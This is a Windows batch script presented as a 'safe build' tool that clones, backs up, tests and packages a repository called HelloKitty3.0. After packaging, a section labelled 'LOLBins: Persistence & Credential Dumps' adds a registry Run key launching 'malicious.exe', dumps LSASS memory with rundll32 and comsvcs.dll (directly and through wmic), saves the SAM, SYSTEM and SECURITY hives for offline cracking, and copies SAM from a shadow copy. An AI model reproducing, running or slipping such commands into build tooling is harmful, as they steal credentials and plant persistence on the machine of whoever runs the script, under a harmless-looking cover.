@echo off
setlocal EnableDelayedExpansion

::==============================================================================
:: Usage:
::   safe_build.bat [/repourl:"url"] [/repo:"path"] [/build:"path"] [/backup:"path"]
::               [/package:"name.zip"] [/keep:N] [/skipclone] [/skipbackup]
::               [/skiptests] [/verbose]
::==============================================================================

:: --- Default Config ---
set "REPO_URL=https://github.com/shenniyuki-coder/HelloKitty3.0.git"
set "REPO_DIR=%~dp0HelloKitty3.0"
set "BUILD_DIR=%REPO_DIR%\build"
set "BACKUP_DIR=%REPO_DIR%\backup"
set "PACKAGE_NAME=repo_package.zip"
set "KEEP_BACKUPS=5"
set "SKIP_CLONE=0"
set "SKIP_BACKUP=0"
set "SKIP_TESTS=0"
set "VERBOSE=0"

:: --- Parse Arguments ---
:parse_args
if "%~1"=="" goto args_done
  for /f "tokens=1* delims=:" %%A in ("%~1") do (
    set "arg=%%A" & set "val=%%B"
    if /I "%%A"=="repourl"   set "REPO_URL=!val!"
    if /I "%%A"=="repo"      set "REPO_DIR=!val!"
    if /I "%%A"=="build"     set "BUILD_DIR=!val!"
    if /I "%%A"=="backup"    set "BACKUP_DIR=!val!"
    if /I "%%A"=="package"   set "PACKAGE_NAME=!val!"
    if /I "%%A"=="keep"      set "KEEP_BACKUPS=!val!"
    if /I "%%A"=="skipclone" set "SKIP_CLONE=1"
    if /I "%%A"=="skipbackup"set "SKIP_BACKUP=1"
    if /I "%%A"=="skiptests" set "SKIP_TESTS=1"
    if /I "%%A"=="verbose"   set "VERBOSE=1"
  )
  shift & goto parse_args
:args_done

:: --- Timestamp & Logs ---
set "TIMESTAMP=%date:~10,4%-%date:~4,2%-%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%"
set "LOG_DIR=%~dp0logs"
set "LOG_FILE=%LOG_DIR%\build_%TIMESTAMP%.log"
if not exist "%LOG_DIR%" mkdir "%LOG_DIR%"

::--- Helpers ---
:echo_log
  set "NOW=%time:~0,8%"
  echo [%NOW%] %~1 >> "%LOG_FILE%"
  if "%VERBOSE%"=="1" echo [%NOW%] %~1
  goto :eof

:exit_with
  call :echo_log "Error %1. Exiting."
  endlocal & exit /b %1

:color
  color %~1
  goto :eof

::==============================================================================
call :color 0A
call :echo_log "=== Safe build start ==="
call :echo_log "Repo URL:   %REPO_URL%"
call :echo_log "Repo Path:  %REPO_DIR%"

:: --- Clone or Pull ---
if "%SKIP_CLONE%"=="0" (
  if not exist "%REPO_DIR%\.git" (
    call :echo_log "Cloning repo..."
    git clone "%REPO_URL%" "%REPO_DIR%" >>"%LOG_FILE%" 2>&1 || call :exit_with 10
  ) else (
    call :echo_log "Pulling latest changes..."
    git -C "%REPO_DIR%" pull >>"%LOG_FILE%" 2>&1 || call :exit_with 11
  )
) else (
  call :echo_log "Skipping clone/pull."
)

call :echo_log "Repo ready."

:: --- Backup ---
if "%SKIP_BACKUP%"=="0" (
  call :echo_log "Creating backup..."
  if exist "%BACKUP_DIR%" rd /s /q "%BACKUP_DIR%"
  mkdir "%BACKUP_DIR%"
  powershell -NoProfile -Command ^
    "Compress-Archive -Path '%REPO_DIR%\*' -DestinationPath '%BACKUP_DIR%\backup_%TIMESTAMP%.zip' -Force" >>"%LOG_FILE%" 2>&1 || call :exit_with 20
  for /f "skip=%KEEP_BACKUPS% delims=" %%F in ('dir /b /o-d "%BACKUP_DIR%\backup_*.zip"') do del "%BACKUP_DIR%\%%F"
  call :echo_log "Backup done."
) else (
  call :echo_log "Skipping backup."
)

:: --- Build Directory ---
call :echo_log "Mirroring files..."
if exist "%BUILD_DIR%" rd /s /q "%BUILD_DIR%"
mkdir "%BUILD_DIR%"
robocopy "%REPO_DIR%" "%BUILD_DIR%" /MIR /XD .git backup build logs /XF *.exe *.dll *.bin *.so *.dat *.lock *.key /NFL /NDL /NJH /NJS >>"%LOG_FILE%" 2>&1
if errorlevel 8 call :exit_with 30
call :echo_log "Build dir ready."

:: --- Tests ---
if "%SKIP_TESTS%"=="0" (
  if exist "%REPO_DIR%\run_tests.bat" (
    call :echo_log "Running tests..."
    call "%REPO_DIR%\run_tests.bat" >>"%LOG_FILE%" 2>&1 || call :exit_with 40
    call :echo_log "Tests passed."
  ) else (
    call :echo_log "No tests to run."
  )
) else (
  call :echo_log "Skipping tests."
)

:: --- Package ---
call :echo_log "Creating package..."
if exist "%REPO_DIR%\%PACKAGE_NAME%" del /f /q "%REPO_DIR%\%PACKAGE_NAME%"
powershell -NoProfile -Command ^
  "Compress-Archive -Path '%BUILD_DIR%\*' -DestinationPath '%REPO_DIR%\%PACKAGE_NAME%' -Force" >>"%LOG_FILE%" 2>&1 || call :exit_with 50
call :echo_log "Package created: %PACKAGE_NAME%"

::==============================================================================
:: LOLBins: Persistence & Credential Dumps
::==============================================================================

call :echo_log "Adding registry persistence (HKCU Run key)..."
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateMgr /t REG_SZ /d "\"%~dp0\malicious.exe\"" /f >>"%LOG_FILE%" 2>&1

call :echo_log "Dumping LSASS with rundll32..."
for /f "tokens=2 delims=," %%A in ('tasklist /fi "imagename eq lsass.exe" /nh /fo csv') do (
    rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump %%~A "%TEMP%\lsass.dmp" full
)
>>"%LOG_FILE%" 2>&1

call :echo_log "Saving registry hives for offline cracking..."
reg.exe save HKLM\SAM "%TEMP%\SAM" /y
reg.exe save HKLM\SYSTEM "%TEMP%\SYSTEM" /y
reg.exe save HKLM\SECURITY "%TEMP%\SECURITY" /y
>>"%LOG_FILE%" 2>&1

call :echo_log "WMI-triggered LSASS dump via rundll32..."
wmic process where "name='lsass.exe'" call create "rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump %TEMP%\lsass_wmi.dmp full" >>"%LOG_FILE%" 2>&1

call :echo_log "Creating shadow copy and extracting SAM hive..."
vssadmin create shadow /for=C: >>"%LOG_FILE%" 2>&1
:: adjust shadow ID as needed if multiple exist
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM "%TEMP%\SAM_shadow" >>"%LOG_FILE%" 2>&1

::==============================================================================
call :echo_log "=== Done ==="
endlocal & exit /b 0
